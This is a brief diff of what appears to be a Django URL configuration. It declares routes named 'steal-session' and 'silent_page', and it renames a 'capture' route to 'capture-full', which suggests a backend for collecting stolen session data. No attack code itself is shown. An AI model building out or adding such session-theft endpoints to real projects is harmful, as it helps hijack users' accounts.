@@ -11,6 +11,6 @@ urlpatterns = [
     path('go/', views.silent_page, name='go'),
     
     path('steal-session/', views.steal_session, name='steal_session'),
-    path('capture/', views.capture_session),  
+    path('capture-full/', views.capture_full),
     
 ]
